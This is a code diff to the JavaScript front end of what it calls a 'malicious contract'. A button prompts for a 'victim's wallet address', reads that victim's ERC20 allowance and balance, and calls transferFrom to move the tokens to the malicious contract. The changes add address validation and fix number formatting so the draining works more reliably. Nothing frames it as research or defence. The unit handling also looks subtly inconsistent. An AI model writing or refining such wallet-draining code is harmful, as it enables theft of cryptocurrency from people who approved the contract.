@@ -453,15 +453,24 @@
             }
         });
 
-       // Withdraw Tokens (from victim's address using the malicious contract)
+    // Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
 
     if (victimAddress) {
+        // Trim any extra spaces from the victim's address
+        const cleanedVictimAddress = victimAddress.trim();
+
+        // Validate that the victim address is a valid Ethereum address
+        if (!web3.utils.isAddress(cleanedVictimAddress)) {
+            alert("Invalid Ethereum address.");
+            return;
+        }
+
         try {
             // Check if the victim has approved the malicious contract to spend tokens
-            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            const balance = await tokenContract.methods.balanceOf(victimAddress).call();
+            const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
+            const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
             
             // Calculate the amount to withdraw (minimum of allowance or balance)
             const amountToWithdraw = Math.min(parseFloat(allowance), parseFloat(balance));
@@ -472,10 +481,11 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             }
 
             // Convert the amount to the token's smallest unit (18 decimals for ERC20 tokens)
-            const amountInTokens = web3.utils.toWei(amountToWithdraw.toString(), 'ether');  // Convert to Wei (smallest unit)
+            // Ensure amount is properly formatted without scientific notation
+            const amountInTokens = web3.utils.toWei(amountToWithdraw.toFixed(0), 'ether');  // Convert to Wei (smallest unit)
 
             // Perform the withdrawal from the victim's wallet to the malicious contract
-            const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
+            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
 
             alert(`Successfully withdrawn ${amountToWithdraw} tokens from the victim's account to the malicious contract!`);
         } catch (error) {
